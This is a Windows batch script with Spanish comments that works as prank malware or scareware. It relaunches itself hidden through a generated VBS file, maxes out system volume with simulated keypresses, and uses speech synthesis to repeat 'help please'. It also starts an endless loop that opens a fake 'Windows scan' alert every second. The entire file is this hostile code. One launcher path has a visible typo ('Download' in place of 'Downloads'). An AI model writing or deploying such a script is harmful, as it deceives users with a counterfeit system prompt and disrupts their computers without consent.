md %userprofile%\Downloads\carpeta
copy final.bat %userprofile%\Downloads\carpeta
IF EXIST %userprofile%\Downloads\carpeta\oculto.vbs (
goto :in
)
echo CreateObject("Wscript.Shell").Run "%userprofile%\Download\final.bat", 0, True > %userprofile%\Downloads\carpeta\oculto.vbs
start oculto.vbs
exit
:in
rem Subir volumen al maximo
echo set oShell = CreateObject("WScript.Shell") >> %userprofile%\Downloads\carpeta\volumenmaximo.vbs
echo oShell.run"%SystemRoot%\System32\SndVol.exe" >> %userprofile%\Downloads\carpeta\volumenmaximo.vbs
echo WScript.Sleep 1500 'Waits For The Program To Open >> %userprofile%\Downloads\carpeta\volumenmaximo.vbs
echo oShell.SendKeys("{PGUP}") >> %userprofile%\Downloads\carpeta\volumenmaximo.vbs
echo oShell.SendKeys("{PGUP}") >> %userprofile%\Downloads\carpeta\volumenmaximo.vbs
echo oShell.SendKeys("{PGUP}") >> %userprofile%\Downloads\carpeta\volumenmaximo.vbs
echo oShell.SendKeys("{PGUP}") >> %userprofile%\Downloads\carpeta\volumenmaximo.vbs
echo oShell.SendKeys("{PGUP}") >> %userprofile%\Downloads\carpeta\volumenmaximo.vbs
rem Creacion de las voces
echo Option Explicit >> %userprofile%\Downloads\carpeta\voice.vbs 
echo Dim David >> %userprofile%\Downloads\carpeta\voice.vbs 
echo 'David's Voice >> %userprofile%\Downloads\carpeta\voice.vbs 
echo Set David = CreateObject("SAPI.spVoice") >> %userprofile%\Downloads\carpeta\voice.vbs 
echo Set David.Voice = David.GetVoices.Item(0) >> %userprofile%\Downloads\carpeta\voice.vbs 
echo David.Rate = 2 >> %userprofile%\Downloads\carpeta\voice.vbs 
echo David.Volume = 100 >> %userprofile%\Downloads\carpeta\voice.vbs 
echo David.Speak "AYUDA POR FAVOR, AYUDA POR FAVOR, AYUDA POR FAVOR, " >> %userprofile%\Downloads\carpeta\voice.vbs
rem Creacion de alerta de aviso
echo X=MsgBox("Quieres escanear el ordenador?",3+48,"Escaneo Windows") >> %userprofile%\Downloads\carpeta\avisos.vbs 
rem Creacion del bucle de avisos
echo :in  >> %userprofile%\Downloads\carpeta\bucle.bat 
echo start %userprofile%\Downloads\carpeta\avisos.vbs  >> %userprofile%\Downloads\carpeta\bucle.bat
echo timeout 1  >> %userprofile%\Downloads\carpeta\bucle.bat 
echo goto :in  >> %userprofile%\Downloads\carpeta\bucle.bat 
rem Iniciar programas
start %userprofile%\Downloads\carpeta\volumenmaximo.vbs
start %userprofile%\Downloads\carpeta\bucle.bat
start %userprofile%\Downloads\carpeta\voice.vbs










